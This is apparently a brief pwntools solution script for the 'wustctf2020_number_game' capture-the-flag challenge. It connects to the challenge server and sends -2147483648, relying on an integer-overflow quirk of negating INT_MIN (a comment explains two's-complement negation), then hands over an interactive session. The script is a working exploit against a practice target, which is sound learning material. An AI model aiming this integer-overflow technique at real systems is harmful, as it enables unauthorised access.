from pwn import *


# p = process("./wustctf2020_number_game")
p = remote("node4.buuoj.cn", 29511)

# -2147483648 < int < 2147483647 
# neg eax 求补运算，包括符号位一起取反然后加1
p.sendline("-2147483648")
p.interactive()


